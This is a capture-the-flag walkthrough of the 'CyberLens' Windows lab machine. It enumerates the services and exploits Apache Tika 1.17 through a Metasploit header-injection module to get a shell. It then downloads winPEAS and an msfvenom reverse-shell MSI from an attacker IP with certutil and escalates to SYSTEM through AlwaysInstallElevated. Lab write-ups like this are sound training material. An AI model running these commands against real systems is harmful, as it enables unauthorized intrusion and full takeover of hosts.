# CyberLens - Easy

* Add ```cyberlens.thm``` to ```/etc/hosts``` and start scan - ```nmap -T4 -p- -A -Pn -v cyberlens.thm```:

  * 80/tcp - http - Apache httpd 2.4.57 ((Win64))
  * 135/tcp - msrpc
  * 139/tcp - netbios-ssn
  * 445/tcp - microsoft-ds
  * 3389/tcp - ms-wbt-server
  * 5985/tcp - http - Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
  * 7680/tcp - tcpwrapped
  * 47001/tcp - http - Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
  * 49664/tcp - msrpc
  * 49665/tcp - msrpc
  * 49666/tcp - msrpc
  * 49667/tcp - msrpc
  * 49668/tcp - msrpc
  * 49669/tcp - msrpc
  * 49670/tcp - msrpc
  * 49677/tcp - msrpc
  * 61777/tcp - http - Jetty 8.y.z-SNAPSHOT

* Starting with web enumeration on port 80:

  ```sh
  gobuster dir -u http://cyberlens.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html,bak,jpg,zip,bac,sh,png,md,jpeg -t 25
  # directory scanning
  ```

* The webpage itself does not seem to be anything out of the ordinary; we do have an interactive feature for 'CyberLens Image Extractor'

* Directory scanning gives us the same pages as we can see in source code - /js, /css/, /images, and other HTML pages

* Viewing the source code for the page, we can see that JS code used for this image extractor tool is included; same as the script 'image-extractor.js' in /js directory:

  ```js
  document.addEventListener("DOMContentLoaded", function() {
    document.getElementById("metadataButton").addEventListener("click", function() {
      var fileInput = document.getElementById("imageFileInput");
      var file = fileInput.files[0];
    
      var reader = new FileReader();
      reader.onload = function() {
        var fileData = reader.result;
    
        fetch("http://cyberlens.thm:61777/meta", {
          method: "PUT",
          body: fileData,
          headers: {
            "Accept": "application/json",
            "Content-Type": "application/octet-stream"
          }
        })
        .then(response => {
          if (response.ok) {
            return response.json();
          } else {
            throw new Error("Error: " + response.status);
          }
        })
        .then(data => {
          var metadataOutput = document.getElementById("metadataOutput");
          metadataOutput.innerText = JSON.stringify(data, null, 2);
        })
        .catch(error => {
          console.error("Error:", error);
        });
      };
    
      reader.readAsArrayBuffer(file);
    });
  });
  ```

* The JS code does the following:

  * the script listens for a click event on the button "Get Metadata"
  * when the button is clicked, it reads the contents of the uploaded image file
  * via a PUT request, the file data is sent to the server endpoint at <http://cyberlens.thm:61777/meta> in JSON form
  * on successful response, it is converted to JSON format and processed further; else an error message is shown
  * the metadata received from server is displayed on the webpage

* Enumerating RPC and SMB services:

  ```sh
  rpcclient -U "" cyberlens.thm
  # NT_STATUS_LOGON_FAILURE

  smbclient -N -L //cyberlens.thm
  # NT_STATUS_ACCESS_DENIED

  crackmapexec smb cyberlens.thm
  # no info
  ```

* On port 61777, the webpage shows a banner for 'Apache Tika 1.17 Server' and a documentation for endpoints and requests.

* We can search for vulns or exploits associated with this version of Apache

* [Rapid7 shows a header command injection exploit](https://www.rapid7.com/db/modules/exploit/windows/http/apache_tika_jp2_jscript/) associated with this version, we can give it a try:

  ```sh
  msfconsole

  use exploit/windows/http/apache_tika_jp2_jscript

  options

  set RHOSTS cyberlens.thm

  set LHOST 10.14.60.75

  set LPORT 61777

  exploit

  # the exploit works and we get a meterpreter shell
  # we can drop into a cmd shell
  shell
  ```

  ```cmd
  # in cmd shell
  cd C:\

  whoami
  # cyberlens\cyberlens

  whoami /priv
  # we have privilege SeChangeNotifyPrivilege enabled

  whoami /groups

  dir
  # we can enumerate for user flag

  cd C:\Users\CyberLens

  cd Desktop

  type user.txt

  cmdkey /list
  # no stored creds

  # we can check winpeas for basic enum

  # in attacker machine, host the file
  python3 -m http.server 8000

  # in victim cmd, fetch the file
  certutil.exe -urlcache -f http://10.14.60.75:8000/winPEASx64.exe winpeas.exe
  
  dir

  .\winpeas.exe
  ```

* From ```winpeas```, we also get a NetNTLMv2 hash for Cyberlens but we are not able to crack it using ```hashcat``` or ```john```

* ```winpeas``` also shows about ```AlwaysInstallElevated``` - we can confirm this using the following:

  ```sh
  reg query HKLM\Software\Policies\Microsoft\Windows\Installer

  reg query HKCU\Software\Policies\Microsoft\Windows\Installer
  ```

* Both of the above values are set to 1 - this means we can use a malicious '.msi' payload as exploit for privesc:

  ```sh
  # in attacker machine
  # create payload
  msfvenom -p windows/x64/shell_reverse_tcp lhost=10.14.60.75 lport=4445 -f msi > revshsetup.msi

  # setup listener
  nc -nvlp 4445

  # in victim cmd
  certutil.exe -urlcache -f http://10.14.60.75:8000/revshsetup.msi setup.msi

  # execute payload
  msiexec /quiet /qn /i setup.msi

  # we get reverse shell
  whoami
  # nt authority\system
  
  # get admin.txt from Administrator Desktop
  ```
